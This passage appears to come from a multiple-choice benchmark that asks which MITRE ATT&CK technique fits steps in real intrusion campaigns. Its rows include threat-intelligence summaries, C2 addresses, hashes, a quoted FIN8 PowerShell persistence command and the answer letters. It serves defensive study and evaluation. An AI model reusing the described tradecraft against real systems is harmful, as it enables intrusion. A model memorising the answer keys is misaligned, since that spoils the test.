Credential Access: The StellarParticle campaign involved various credential access techniques. They stole web session cookies from end-user workstations to access cloud resources and used both privileged and non-privileged accounts for RDP throughout the environment. They also used compromised service principals to make changes to the Office 365 environment and accessed data from Information Repositories.
Discovery: The threat actor used AdFind, standard PowerShell cmdlets, and custom tooling to identify various pieces of information from Active Directory. They regularly interrogated other systems using tasklist.exe and probed external services in an attempt to regain access to the environment.
Lateral Movement: The threat actor used both privileged and non-privileged accounts for RDP throughout the environment, depending on the target system.
Collection: The threat actor accessed data from Information Repositories.",D
2616,58,58-Privilege Escalation-T1053-Scheduled Task/Job,"After delivering the Flash exploit ""flash_video_x86.swf"" through a spear-phishing email to execute arbitrary code, which ATT&CK technique most likely occurred to maintain persistence on the victim's machine by leveraging elevated privileges?",T1221-Template Injection,T1053-Scheduled Task/Job,T1543.003-Windows Service,T1566-Phishing,"Initial Access: The Sednit espionage group, also known as APT28 or Fancy Bear, has been actively using a Flash exploit, identified as CVE-2015-5119, to target Eastern European institutions. This exploit was part of the Hacking Team data leak and allows attackers to execute arbitrary code remotely. The Sednit group's attack begins with a spear-phishing email containing a URL that mimics a legitimate domain, such as ""osce-press.org"". Upon visiting the URL, the victim's browser is directed to a landing page that collects detailed information about the computer. If the system meets the criteria set by the Sednit operators, the Flash exploit named ""flash_video_x86.swf"" is delivered. The exploit's decompiled code closely resembles the Hacking Team's version, with the main difference being the way the shellcode is received.
Persistence: If the Flash exploitation is successful, the victim's system receives a first-stage backdoor malware, which ensures the target is as intended. This malware includes the Hacking Team's Windows privilege escalation exploit. The Sednit group appears to have recompiled the source code of the exploit without altering its logic. Once the privilege escalation exploit is effective, the malware establishes persistence on the machine through a scheduled task that runs with the highest privileges.
Others: The Hacking Team data leak, which occurred over the weekend prior to July 10, 2015, involved more than 400GB of internal data, including business proposals and source code of the software sold by the company. The leaked data provided a complete exploitation chain for cyber attacks. ESET Research has urged users to upgrade their Flash software to mitigate the risks associated with these exploits. Indicators of Compromise (IoCs) have been identified, including the exploit kit domain name ""osce-press.org"", the Sednit Flash exploit with SHA1 hash D43FD6579AB8B9C40524CC8E4B7BD05BE6674F6C, the Sednit first-stage backdoor with SHA1 hash 51B0E3CD6360D50424BF776B3CD673DD45FD0F97, and the payload persistence script and file names ""fvecer.bat"" and ""api-ms-win-downlevel-profile-l1-1-0.dll"" with SHA1 hash B8B3F53CA2CD64BD101CB59C6553F6289A72D9BB.",B
1681,312,312-Initial Access-T1566-Phishing,"Before executing the PoisonIvy backdoor Trojan to establish communication with a C&C server over TCP port 80, which ATT&CK technique most likely occurred as attackers initiated their campaign to deliver malicious attachments?",T1074-Data Staged,T1566.002-Spearphishing Link,T1098.006-Additional Container Cluster Roles,T1566-Phishing,"Execution: Upon opening the malicious email attachment, the recipient inadvertently executed a file that installed PoisonIvy. This backdoor Trojan then contacted a C&C server using an encrypted communication protocol over TCP port 80. The attackers could then command the compromised computer to disclose its IP address, the names of other computers in the network, and Windows cached password hashes. The attackers used this access to traverse the network, infect additional computers, and ultimately aimed to obtain domain administrator credentials or access systems storing intellectual property.
Credential Access: The attackers leveraged the PoisonIvy Trojan to dump Windows cached password hashes from the compromised systems. This allowed them to potentially crack the passwords and gain unauthorized access to additional systems within the network.
Lateral Movement: The attackers used the credentials obtained from the compromised systems to move laterally within the network. Their goal was to find and access servers hosting sensitive intellectual property.
Collection: Once the attackers identified the desired intellectual property, they copied it to archives on internal systems that served as staging servers. This content was then prepared for exfiltration.
Command and Control: The PoisonIvy backdoor Trojan communicated with a C&C server over TCP port 80. The communication involved a handshake using an encryption algorithm, and the server would send binary code to be executed by the compromised system. Several C&C domains and IP addresses were identified, with some samples connecting directly to an IP address associated with a Chinese QQ user and antivirus-groups.com.
Exfiltration: The attackers uploaded the collected intellectual property from the internal staging servers to a remote site outside of the compromised organization, completing the attack.
Others: The Nitro Attacks targeted private companies in the chemical industry to steal intellectual property such as design documents, formulas, and manufacturing processes. The campaign began in late July 2011 and continued into mid-September 2011, with C&C servers used as early as April 2011. The attackers' geographic spread was wide, with infected machines located in the US, Bangladesh, the UK, and other countries. Attribution was traced back to a VPS in the US owned by a male located in the Hebei region of China, known as Covert Grove. The attacks used PoisonIvy, a RAT developed by a Chinese speaker. Other hacker groups also targeted the same chemical companies during this period, using malicious PDF and DOC files to drop variants of Backdoor.Sogu. The relationship between these groups is unclear.",B
2445,40,40-Defense Evasion-T1027-Obfuscated Files or Information,Which ATT&CK technique most likely occurred after DRAGONFISH used anti-virtual-machine features and obfuscation methods to exfiltrate data to the C2 server as part of its defense evasion strategy?,T1027-Obfuscated Files or Information,T1059.010-AutoHotKey & AutoIT,T1070.004-File Deletion,T1012-Query Registry,"Initial Access: The threat group DRAGONFISH, also known as Lotus Blossom, has been distributing a new variant of Elise malware through a malicious Microsoft Word document. The document, which contains information on ADMM-Plus members, embeds a malicious executable file as an OLE object. This file is dropped to the %temp% folder upon opening the document and is executed by exploiting the CVE-2017-11882 vulnerability. The payload is then moved to \AppData\Roaming\Microsoft\Windows\Caches\ as a file named NavShExt.dll, and the original executable is deleted.
Execution: The Elise malware initiates the following sequence of actions: it starts the Internet Explorer process (iexplore.exe) in a suspended state, injects the NavShExt.dll into the process, and calls the DLL's export function named 'Setting'. The process then continues to run in the background. The malware creates a mutex named 'donotbotherme' to prevent duplicate executions and stores harvested data in a file named thumbcache_1CD60.db located in AppData\Local\Microsoft\Windows\Explorer\. It also sends data to and downloads files and commands from a hardcoded C2 server with the IP address 103.236.150[.]14.
Persistence: Persistence is achieved by using the Run Registry key with the value name IAStorD located at HKCU\Software\Microsoft\Windows\CurrentVersion\Run\IAStorD. Additionally, two hidden DLLs with export functions named DePatchEntry or EvilEntry are injected into iexplore.exe to provide loading and anti-analysis functionalities.
Discovery: The malware harvests extensive system information, including LAN and WAN IP addresses (using ipaddress.com for the latter), installed software list, proxy information, process enumeration via tasklist, and a list of all files on the user's desktop.
Command and Control: The malware communicates with a hardcoded C2 server with the IP address 103.236.150[.]14, sending harvested data and receiving files and commands.
Others: iDefense analysts have identified a campaign by the threat group DRAGONFISH targeting the ASEAN Defence Ministers' Meeting (ADMM) and associated individuals for espionage. The malware is capable of providing the attacker with a remote shell on the host and can completely uninstall itself. Execution debug messages are stored in the %temp% folder in a file named FXSAPIDebugLogFile.tmp, and logs are encrypted using a static AES key. To mitigate the threat, security teams are advised to block access to the C2 server and ensure the installation of Microsoft Security Update KB2553204 to patch the CVE-2017-11882 vulnerability. Analysts should look for artifacts such as a value named IAStorD in the autorun key, a file named FXSAPIDebugLogFile.tmp, a mutex handle named donotbotherme, and thumbcache_1CD60.db in AppData\Local\Microsoft\Windows\Explorer\.",A
1456,287,287-Command and Control-T1090-Proxy,Which ATT&CK technique most likely occurred after GADOLINIUM used open-source tools and cloud services for defense evasion to set up a malicious infrastructure that can be quickly established and dismantled?,T1546.007-Netsh Helper DLL,T1566-Phishing,T1008-Fallback Channels,T1090-Proxy,"Initial Access: In 2019, GADOLINIUM delivered malicious Access database files to targets via spear-phishing emails. The initial file was an Access 2013 database (.accde format) that dropped a fake Word document, an Excel spreadsheet, and a VBA dropper called mm.accdb.core, which executed a .NET DLL payload. In 2020, GADOLINIUM sent spear-phishing emails with malicious PowerPoint attachments related to COVID-19, which dropped a file named doc1.dotm.
Privilege Escalation: GADOLINIUM used tools like LazyCat, which includes privilege escalation and credential dumping capabilities, to enable lateral movement across victim networks. Microsoft Defender for Endpoint detects the privilege escalation technique used by LazyCat.
Defense Evasion: GADOLINIUM has been using cloud services and open-source tools to obfuscate their activity and make it difficult for analysts to track. They have used cloud-based technology to create a malicious infrastructure that can be quickly established and taken down before detection or given up at little cost.
Others: Microsoft Security tracks advanced threat actors like GADOLINIUM and shares findings to harden products and platforms. Microsoft suspended 18 Azure Active Directory applications part of GADOLINIUM's malicious C2 infrastructure, protecting customers transparently. GADOLINIUM, a nation-state activity group, has been compromising targets for nearly a decade, focusing on the maritime and health industries, and has expanded targeting to the Asia Pacific region, higher education, and regional government organizations. Microsoft's proactive defense measures include detecting individual attack components and preventing attackers from using cloud infrastructure to execute attacks.",B
372,148,148-Initial Access-T1566-Phishing,Which ATT&CK technique most likely occurred after the adversaries used weaponized exploit documents to establish initial access but before BBSRAT malware ensured persistence by writing to a registry key?,T1041-Exfiltration Over C2 Channel,T1566-Phishing,T1556.005-Reversible Encryption,T1078.003-Local Accounts,"Execution: The CTI report describes the execution process of the BBSRAT malware. Upon initial execution, the dropper generates a path in the %TEMP% directory and writes an embedded cab file. It then creates directories based on the Windows version and uses the expand.exe utility to write three files to the SSONSVR directory: aclmain.sdb, pnipcn.dll, and ssonsvr.exe. The legitimate Citrix executable ssonsvr.exe is used to sideload the malicious pnipcn.dll file, which then identifies the path to msiexec.exe, spawns a suspended instance of it, and performs process hollowing before resuming the process. To ensure persistence, a registry key is written to run ssonsvr.exe on startup.
Persistence: The BBSRAT malware ensures persistence by writing a registry key on the victim's machine to run the ssonsvr.exe file on startup. Additionally, the malware uses a downloader that deploys a DLL to either %SYSTEMROOT%\web\srvcl32.dll or %APPDATA%\web\srvcl32.dll, with corresponding registry keys set to ensure the DLL loads when Windows starts. This technique was previously used by the ZeroAccess rootkit.
Command and Control: The CTI report identifies the command and control (C2) infrastructure used by the BBSRAT malware. Analysis shows that the new samples used the same C2 domains as the 'Roaming Tiger' campaign, including transactiona[.]com and futuresgold[.]com. The C2 domains have significant overlap among the hashes and IPs, but the BBSRAT C2s contain no overlap, suggesting purpose-built variants and infrastructure for each target. BBSRAT communicates with the C2 server using HTTP or HTTPS requests and exfiltrates data about the victim's machine via POST requests.
Exfiltration: The BBSRAT malware exfiltrates data about the victim's machine to the C2 server using POST requests with a custom binary structure. The data is compressed using ZLIB and, if sent via HTTP, an additional encryption algorithm is applied.
Others: The CTI report mentions that despite public knowledge of their tactics, techniques, and procedures (TTPs), the adversaries continue to reuse much of their exposed playbook. Organizations are urged to use threat intelligence data proactively to secure themselves and prevent attacks. The report also includes a YARA rule for detecting BBSRAT and a list of identified BBSRAT samples with their associated C2 servers.",B
581,174,174-Discovery-T1069-Permission Groups Discovery,"After threat actors evaded defenses using Dumpert with API unhooking and a .NET loader, which ATT&CK technique most likely occurred before they moved laterally to other systems using dumped credentials through Impacket's atexec tool?",T1550-Use Alternate Authentication Material,T1546.005-Trap,T1069-Permission Groups Discovery,T1120-Peripheral Device Discovery,"Initial Access: On September 10, 2019, unknown threat actors exploited a vulnerability in SharePoint described in CVE-2019-0604 to install several webshells on the website of a Middle East government organization. One of these webshells is the open source AntSword webshell, similar to the China Chopper webshell.
Execution: The actors used the AntSword webshell to run a variety of commands on the compromised server for initial system and user discovery, as well as to ping systems of interest. They also uploaded tools to the server, including cURL, a custom Mimikatz variant, and compiled variants of Impacket's wmiexec and atexec tools.
Defense Evasion: The actors used a custom Mimikatz variant with a .NET loader to evade detection. Additionally, they uploaded the Dumpert tool, designed to evade antivirus and EDR solutions by using direct system calls and API unhooking.
Credential Access: The actors used Mimikatz to dump credentials from memory and Impacket tools to use the pass the hash technique to run commands on other systems.
Lateral Movement: Using the collection of webshells, the actors moved laterally to other systems on the network by dumping credentials with a variant of the notorious Mimikatz tool and using Impacket's atexec tool to use dumped credentials to run commands on other systems.
Command and Control: The actors used the AntSword webshell to communicate with the compromised server and run commands. They also used the AntSword Shell Manager to interact with the webshell.
Others: Palo Alto Networks customers are protected from the threat described in this report through Threat Prevention signatures for the exploits and C2 traffic as well as through WildFire. The CVE-2019-0604 vulnerability is covered by IPS signature Microsoft SharePoint Remote Code Execution Vulnerability (55411). The Awen Webshell and AntSword ASPX Webshell are detected by IPS signatures. The Mimikatz, Impacket atexec, and Dumpert tools are all marked with malicious verdicts by WildFire.",C
1015,230,230-Defense Evasion-T1027-Obfuscated Files or Information,Which ATT&CK technique most likely occurred after Gamaredon employed scripting through Batch files and VBScript to execute payloads and before registering modules as scheduled tasks for persistence?,T1129-Shared Modules,T1027-Obfuscated Files or Information,T1534-Internal Spearphishing,T1027.004-Compile After Delivery,"Initial Access: The Gamaredon group initiates attacks by sending spearphishing emails with malicious attachments to targets, leveraging trusted relationships by abusing compromised organization's email accounts to send emails with malicious attachments to the victim's contacts.
Execution: Gamaredon employs scripting, mostly Batch files and VBScript, and uses rundll32 to launch malicious DLLs, such as the C/C++ backdoor. They also use CreateProcess to launch additional components, like executing payloads from C&C servers, and rely on user execution of malicious email attachments for initial compromise.
Persistence: The group registers several modules as scheduled tasks for persistence and uses Registry Run keys and the Startup folder to ensure modules execute at every reboot. They also insert malicious macros into existing documents, providing persistence when they are reopened.
Discovery: The group's backdoors automatically list interesting files, such as Office documents, found on a system for future exfiltration.
Lateral Movement: Gamaredon injects malicious macros into all Word and Excel documents reachable by the compromised system and uses its Outlook VBA macro to send email with malicious attachments to other targets within the same organization.
Collection: Gamaredon's malware searches for sensitive documents on the local system and scans all drives, including removable drives and network shares mounted as drives, for sensitive data. They also have a backdoor that takes screenshots every minute and deploy scripts that automatically scan for interesting documents.
Command and Control: The group's malware uses both HTTP and HTTPS for command and control.
Exfiltration: Gamaredon's modules automatically upload harvested documents to the C&C server.
Others: The Gamaredon group has been active since at least 2013, mostly targeting Ukrainian institutions. They have increased activity in recent months with constant waves of malicious emails. The group uses a variety of programming languages and simple tools designed to gather sensitive information and spread further. They do not seem to make efforts to stay under the radar, focusing on spreading quickly and exfiltrating data. The group uses many different domains for C&C servers, both free and paid, and changes them frequently. They also use separate domains for small groups of victims. Despite errors in their tools, the group's rapid execution and adaptation create a state of constant dread in their targets. Persistence techniques include scheduled tasks, autorun registry keys, and leveraging the Startup folder. The group's strategy of installing multiple scripts and executables on each system and constantly updating them complicates defenders' efforts.",A
370,147,147-Discovery-T1482-Domain Trust Discovery,"After using system fingerprinting commands like systeminfo.exe and tasklist.exe, which ATT&CK technique most likely occurred to identify relationships between domains in the victim's network?",T1597.001-Threat Intel Vendors,T1482-Domain Trust Discovery,T1040-Network Sniffing,T1059-Command and Scripting Interpreter,"Initial Access: The FIN8 group, known for targeting retail, hospitality, and entertainment sectors, has been observed using a backdoor called BADHATCH to gain initial access to networks. The latest version of BADHATCH, v2.14, uses a malicious PowerShell command line to download and execute a script from a domain mapped by the sslip.io service, which is abused to evade detection. The script, identified by a hash value, employs base64 representations of shellcode for different architectures and uses a .NET binary to execute the shellcode in memory.
Execution: BADHATCH, once executed, can operate in two modes: CMD or POWERSHELL. In POWERSHELL mode, it launches powershell.exe with a command line that executes commands from a pipe using IEX. It supports custom commands such as info, Ping-Comp, Check-Port, Check-Share, psx, and GetComputerInfo. In CMD mode, it uses cmd.exe to execute a different set of commands, including spawn, proxy local, proxy bc, proxy status, ftp, steal, revert, and eventlog.
Persistence: FIN8 ensures persistence by using the WMI event subscription mechanism. A PowerShell script, indicated by the command line 'powershell.exe -nop -ep bypass -c c:\windows\temp\m.ps1 f9eef8b27ff68f41a8eb0b8739370640', sets up an event consumer named PerfData with a command line associated with it. This involves creating a WMI object named Win32_Base64Class with a property 'Prop' containing a base64 string of a .NET binary, which creates a svchost.exe process for code injection.
Privilege Escalation: The deployment of BADHATCH involves privilege escalation, as indicated by the execution of a script named sh-tmp.ps1, which likely escalates privileges since subsequent commands are executed on behalf of the SYSTEM user. The exact method of privilege escalation is not detailed, but it is associated with the use of the SYSTEM token and potentially involves impersonating tokens of processes like lsass.exe.
Defense Evasion: BADHATCH employs various defense evasion techniques, including the use of TLS encryption to conceal PowerShell commands and masquerading its communication with the C&C server as legitimate HTTP requests. It also uses a proxy to perform TLS encryption and redirection of decrypted data to the actual C&C application.
Credential Access: Credential dumping is suggested by the execution of a script named mimi.ps1, which is speculated to be related to Mimikatz. This is supported by telemetry data indicating that the PowerShell process read the memory of lsass.exe, which is a common target for credential dumping.
Lateral Movement: Lateral movement to the Domain Controller was achieved using wmic.exe to create a process on the DC and execute the BADHATCH deployment script. The output redirection to a local ADMIN$ share suggests the use of the wmiexec.py tool from Impacket.
Others: FIN8 has targeted victims in various countries, including the United States, Canada, South Africa, Puerto Rico, Panama, and Italy, across industries such as insurance, retail, technology, and chemicals. Bitdefender recommends separating POS networks, cybersecurity awareness training, integrating threat intelligence, and considering outsourcing security operations to Managed Detection and Response providers.",B
725,191,191-Discovery-T1012-Query Registry,"During Operation Sharpshooter, after establishing persistence by placing the second-stage binary in the startup folder, which ATT&CK technique most likely occurred before the Rising Sun implant communicated with control servers using HTTP POST requests?",T1059.001-PowerShell,T1012-Query Registry,T1497.001-System Checks,T1589-Gather Victim Identity Information,"Reconnaissance: The McAfee Advanced Threat Research team reported that Operation Sharpshooter masqueraded as legitimate industry job recruitment activity to gather information for potential exploitation. The campaign used similar techniques associated with other job recruitment campaigns. The malicious documents contained Korean-language metadata and English-language job description titles, indicating a focus on English-speaking targets or those with English-speaking regional offices. The majority of targets were defense and government-related organizations.
Initial Access: Operation Sharpshooter began on October 25 with a series of malicious documents authored by 'Richard' and distributed via an IP address in the United States and through Dropbox. These documents contained a malicious macro that injected the Sharpshooter downloader into the memory of Word, which then retrieved the second-stage implant Rising Sun from a control server.
Execution: The shellcode executed by the macro in winword.exe acted as a downloader for the Rising Sun implant. It resolved Libraries and APIs using LoadLibraryA() and GetProcAddress(), downloaded the second-stage payload and a decoy document to the startup folder and %LOCALAPPDATA% respectively, and executed both payloads using CreateProcessA() and ShellExecuteA().
Persistence: The Rising Sun implant ensured persistence on the system by downloading the second-stage binary to the startup folder during the download process, thereby removing the need for the implant to set up persistence for itself.
Command and Control: The Rising Sun implant communicated with control servers using HTTP POST requests, sending data in various formats encrypted with RC4 and obfuscated with Base64 encoding. The control servers identified were 34.214.99.20/view_style.php, 137.74.41.56/board.php, and kingkoil.com.sg/board.php.
Exfiltration: The Rising Sun implant encrypted data using the RC4 stream encryption algorithm and obfuscated it with Base64 encoding before exfiltrating it to the control server via HTTP POST requests.
Others: The McAfee Advanced Threat Research team discovered a new implant framework using code from the 2015 backdoor Duuzer, which was last seen targeting South Korea and Japan. The Rising Sun implant shares multiple similarities with Lazarus Group attacks but also raises the possibility of false flags. The campaign targeted nuclear, defense, energy, and financial companies globally, predominantly in the United States. The implant carries 14 backdoor capabilities, including executing commands, gathering drive and process information, reading and writing files, and modifying file attributes. Attribution to the Lazarus Group is suggested but not confirmed due to potential false flags.",B
951,222,222-Exfiltration-T1020-Automated Exfiltration,"After staging data by scanning for files matching specific extensions and creating a file containing paths of all files to exfiltrate during the Collection phase, which ATT&CK technique most likely occurred after the malware communicated with the C&C server over ports 80 or 443?",T1543.001-Launch Agent,T1113-Screen Capture,T1567.002-Exfiltration to Cloud Storage,T1020-Automated Exfiltration,"Initial Access: The Sednit group, also known as APT28, Fancy Bear, Sofacy, or STRONTIUM, launched a spearphishing email campaign at the end of August 2018, distributing shortened URLs that delivered the first stage of Zebrocy components. The campaign relied on social engineering to lure victims into running the first part of the chain. The URL led to an IP-address-based URL where the archived payload was located, containing an executable file and a decoy PDF document. The executable, when run, would prompt for a password and then open the decoy PDF, while the downloader written in Delphi continued to run in the background.
Execution: The Sednit group's operators took control of the backdoor and began sending commands immediately after the victim executed the downloader. The commands included taking screenshots, gathering system information, network scanning, and executing various system commands to collect data from the victim's computer. The operators used a Stage-1 downloader to download and execute a new downloader, written in C++, which then downloaded a Delphi backdoor. The backdoor's configuration was stored in the resource section, split into four different hex-encoded, encrypted blobs.
Persistence: The operators used COM object hijacking for persistence, adding registry keys for a custom backdoor that was executed using the CMD_EXECUTE command. This backdoor was installed only for a few hours and was removed quickly after its operators completed their tasks.
Defense Evasion: The Sednit group's malware deleted files (binaries and files created) after usage and killed processes to disable security tools.
Credential Access: The operators uploaded and used dumpers on victims' machines to target browsers and versions of Microsoft Outlook from 1997 through 2016. They retrieved databases related to credentials from software such as Firefox, The Bat! email client, and Opera.
Discovery: The operators gathered information about the victim's computer and environment, including registry keys enumeration, listing running processes, and using system commands to gather information about the victim.
Collection: The malware scanned for files matching specific extensions on the local system, network shared drives, and removable media. It staged data by creating a file containing paths of all files to exfiltrate and had features for input capture and screen capture.
Command and Control: The downloaders and backdoors communicated with the C&C server using commonly used ports 80 or 443. Data sent were hex-encoded and encrypted with AES or a custom algorithm. A fallback C&C server was embedded in the configuration.",D
2356,39,39-Privilege Escalation-T1548-Abuse Elevation Control Mechanism,Which ATT&CK technique most likely occurred before BRONZE PRESIDENT used native tools like vssadmin to create volume shadow copies on domain controllers during their privilege escalation efforts?,T1562-Impair Defenses,T1574.001-DLL Search Order Hijacking,T1548-Abuse Elevation Control Mechanism,T1497-Virtualization/Sandbox Evasion,"Reconnaissance: The BRONZE PRESIDENT cyberespionage group, likely based in the People's Republic of China (PRC), has been observed targeting non-governmental organizations (NGOs) and political and law enforcement organizations in South and East Asia since mid-2018. The group uses phishing lures related to national security, humanitarian, and law enforcement topics to gather information.
Resource Development: BRONZE PRESIDENT has developed its own remote access tools and also utilizes publicly available tools. The group's infrastructure is linked to entities within the PRC and PRC-based Internet service providers. Tools such as PlugX, historically leveraged by PRC-based groups, are part of their arsenal.
Initial Access: BRONZE PRESIDENT likely uses phishing emails with ZIP attachments containing LNK files as an initial access vector. The group has been observed gaining administrator access to all systems within a targeted business unit and installing remote access tools on a significant number of hosts.
Execution: The group employs a variety of tools for execution, including Cobalt Strike, PlugX, ORat, and RCSession. Cobalt Strike is installed on over 70% of accessible hosts in some intrusions, and RCSession is installed via DLL side-loading.
Persistence: BRONZE PRESIDENT uses WMI event consumers and scheduled tasks to maintain persistence on compromised hosts. The group creates and maintains tasks like the Sysdriver scheduled task to periodically execute payloads.
Defense Evasion: BRONZE PRESIDENT takes steps to minimize detection, such as deleting volume shadow copies after use and killing processes post-execution. The group installs malware on many hosts but exercises restraint to avoid detection.
Credential Access: The group collects credentials from high-privilege network accounts and reputationally sensitive accounts, such as social media and webmail accounts. They also extract password hashes from NTDS.dit files for offline exploitation.
Discovery: BRONZE PRESIDENT uses tools like Nmap, Nbtscan, net user, and ping commands to understand network environments and identify opportunities for lateral movement.
Lateral Movement: The group leverages Wmiexec extensively to move laterally and execute WMI commands on remote hosts. They also use net commands to connect to other hosts using compromised credentials.
Collection: BRONZE PRESIDENT targets specific data types and uses custom batch scripts to collate identified files into archives. They use scripts named after various file extensions to collect files from specific locations.
Command and Control: The group's C2 techniques vary based on the remote access tools used. RCSession communicates with a hard-coded C2 server using a custom protocol, while ORat uses a raw socket protocol. Cobalt Strike uses malleable C2 profiles and connects to multiple C2 domains.
Exfiltration: BRONZE PRESIDENT uses tools like RCSession and Cobalt Strike to exfiltrate archived data. They target specific data types and use custom batch scripts to create lists of files with predefined criteria for exfiltration.
Others: Secureworks Counter Threat Unit researchers have been monitoring BRONZE PRESIDENT activity since mid-2018, with artifacts suggesting network intrusions dating back to 2014. The group's long-term objective appears to be monitoring target networks. BRONZE PRESIDENT's systemic long-term targeting does not align with patriotic or criminal threat groups, suggesting government sponsorship or tolerance.",C
2869,9,9-Defense Evasion-T1027-Obfuscated Files or Information,Which ATT&CK technique most likely occurred before the malware payload within CCleaner 5.33 attempted to evade detection by zeroing out the IMAGE_DOS_HEADER and using a valid digital signature?,T1027-Obfuscated Files or Information,T1490-Inhibit System Recovery,T1222-File and Directory Permissions Modification,T1008-Fallback Channels,"Initial Access: The CTI report from September 18, 2017, authored by Edmund Brumaghin and others from Cisco's Talos Intelligence Group, details a supply chain attack where the download servers of the software vendor Avast were compromised to distribute a malicious version of CCleaner. The affected version, CCleaner 5.33, released on August 15, 2017, contained a multi-stage malware payload. The 32-bit CCleaner binary included in the installer had been modified to execute malicious code before proceeding with the normal CCleaner operations. This version was hosted on CCleaner's download server until September 11, 2017, and was signed with a valid certificate issued to Piriform Ltd by Symantec, valid through October 10, 2018. A second malicious sample was also discovered, signed approximately 15 minutes after the first one.
Execution: The malicious 32-bit CCleaner binary from the installer for version 5.33 was modified to call to the code at CC_InfectionBase(0x0040102C), redirecting code execution flow to the malicious code. This initiated the decryption of data containing two stages of the malicious payload: a Position Independent Code (PIC) PE loader and a DLL file functioning as the malware payload. The malware author attempted to evade detection by zeroing out the IMAGE_DOS_HEADER. The binary created an executable heap, copied the decrypted malware to it, and then called the PE loader to begin its operation. After initiating the infection process, the binary erased the memory regions containing the PE loader and the DLL file, destroyed the heap, and continued with normal CCleaner operations.
Command and Control: The malware established a Command and Control (C2) channel by encrypting and encoding system information using modified Base64, then transmitting it via an HTTPS POST request to 216[.]126[.]225[.]148. The communications leveraged a hardcoded HTTP Host header set to speccy[.]piriform[.]com and ignored security errors from the server's self-signed SSL certificate. If no response was received from the C2 server, the malware fell back to a Domain Generation Algorithm (DGA). The malware stored the C2 IP address and the current system time plus two days in the registry at HKLM\SOFTWARE\Piriform\Agomo:NID and HKLM\SOFTWARE\Piriform\Agomo:TCID, respectively.
Impact: The impact of the attack could be severe due to the high number of systems potentially affected. CCleaner claimed over 2 billion downloads worldwide as of November 2016. Affected systems needed to be restored to a state before August 15, 2017, or reinstalled, and users were advised to update to the latest version of CCleaner, which at the time of the report was version 5.34.
Others: The CTI report includes additional information about the investigation and response to the threat. Cisco Talos released ClamAV signatures 6336251 and 6336252 to detect the threat. Advanced Malware Protection (AMP), Cisco's Web Security Appliance (WSA), AMP Threat Grid, and Umbrella were recommended for protection against the threat. Indicators of Compromise (IoCs) were provided, including file hashes, DGA domains, and IP addresses. The report also noted that antivirus detection for this threat was low at the time of writing.",A
1359,274,274-Initial Access-T1189-Drive-by Compromise,"After CrowdStrike's Falcon Host detected an attack involving a first stage downloader saving a file at ""%Temp%/Rdws.exe"" that later retrieves a second stage PlugX file, which ATT&CK technique most likely facilitated the adversary's method of gaining access through the compromised website spoofing the ""Center on Budget and Policy Priorities""?",T1566.003-Spearphishing via Service,T1573-Encrypted Channel,T1648-Serverless Execution,T1189-Drive-by Compromise,"Command and Control: The INOCNATION Campaign involved a new variant of Sakula malware that conducted C2 communications with the domain inocnation[.]com. The Ironman Campaign involved Sakula malware that communicated with a C2 IP address of 180.210.206.246. The French Aerospace Campaign involved Sakula connecting to a C2 domain of oa[.]ameteksen[.]com. The Sakula malware has been linked to the use of a number of zero-day exploits and high-profile incidents such as those resulting in healthcare and government data breach notifications earlier this year.
Others: The Sakula malware variant has been linked to several significant targeted intrusion campaigns over the past 2-3 years, including the ""French Aerospace"" Campaign and the ""Ironman"" Campaign. CrowdStrike has observed limited use of what appears to be a third Sakula variant. Sakula is assessed as a limited-release tool in use by multiple adversaries. There is an apparent connection between the use of Sakula and PlugX, with evidence that Sakula and PlugX samples have relied on the same C2 infrastructure. The Sakula malware demonstrates the difficulty of attribution and the rationale for bookending technical information with analytic judgments. It is likely used by a small subset of operators, which, given the access to zero-day exploits and high-profile operations, are likely well-resourced.",A
2662,61,61-Collection-T1039-Data from Network Shared Drive,"After the Korplug malware gathered system information and network details such as uptime, Windows version, and CPU clock rate, which ATT&CK technique most likely occurred to enable the malware to access and collect data from shared resources within the target's network?",T1555.002-Securityd Memory,T1082-System Information Discovery,T1039-Data from Network Shared Drive,T1602-Data from Configuration Repository,"Resource Development: ESET researchers discovered an ongoing campaign by Mustang Panda using a new Korplug variant named Hodur, which has been active since at least August 2021. The campaign targets research entities, internet service providers, and European diplomatic missions, leveraging current events in Europe, such as Russia's invasion of Ukraine, to lure victims with phishing documents. The group behind the campaign, attributed to Mustang Panda (also known as TA416, RedDelta, or PKPLUG), is known for targeting governmental entities and NGOs, primarily in East and Southeast Asia, with a focus on Mongolia. They have also targeted the Vatican in 2020. The campaign uses custom loaders for shared malware like Cobalt Strike, Poison Ivy, and Korplug, and is characterized by the use of anti-analysis techniques and control-flow obfuscation at every stage of the deployment process.
Initial Access: The initial access vector is not explicitly observed but is believed to involve phishing and watering hole attacks. The campaign uses filenames related to current events, such as 'COVID-19 travel restrictions EU reviews list of third countries.exe' and 'Situation at the EU borders with Ukraine.exe', to deliver a downloader that also opens a decoy document to distract the victim. These documents are often legitimate and publicly accessible, reflecting the filenames used.
Execution: Mustang Panda's campaign utilizes a custom loader to execute the new Korplug variant. The loader is a DLL that exploits a side-loading vulnerability in a legitimate, signed executable. The loader exports multiple functions, but only one function is responsible for loading the final malware stage. The loader function decrypts the encrypted Korplug file in memory and makes the buffer executable before calling into it.
Persistence: The Korplug variant establishes persistence by creating a directory under %allusersprofile%, marking it as hidden and system, and copying the necessary files to this directory. It then sets up persistence either by creating a scheduled task to run at boot or by adding a registry entry to Software\Microsoft\Windows\CurrentVersion\Run. The malware launches the executable from its new location and exits.
Defense Evasion: Mustang Panda's campaign features heavy use of control-flow obfuscation and anti-analysis techniques at every stage of the deployment process. The downloader and loader use various methods to obfuscate the control flow, including junk code, opaque predicates, and encrypted stack strings. The Korplug file is encrypted and only decrypted at runtime, and its configuration data is encrypted with XOR. The directories created during the installation process are set as hidden system directories, and the malware can run commands on a hidden desktop.
Discovery: The Korplug variant collects extensive information about the system, including uptime, Windows version, CPU clock rate, amount of RAM, and display resolution. It also retrieves the system locale, hostname, and IP addresses, and uses GetSystemTime to retrieve the current system time.
Command and Control: Korplug communicates with C&C servers using a custom TCP-based protocol. The initial handshake can be done over HTTPS or TCP, and subsequent communication is always done over TCP. The communication is encrypted using RC4 and may use non-standard ports. The configuration contains fallback C&C servers, and Korplug can download additional files from the C&C server.
Exfiltration: Data exfiltration is performed via the same custom protocol used to send and receive commands, involving TCP messages with a header followed by a compressed and encrypted message body.
Others: The campaign uses filenames that reflect current events to lure victims, demonstrating Mustang Panda's ability to quickly react to world events. The group iteratively improves its tools, including the use of trident downloaders to deploy Korplug. ESET Research offers private APT intelligence reports and data feeds, and inquiries can be directed to threatintel@eset.com.",C
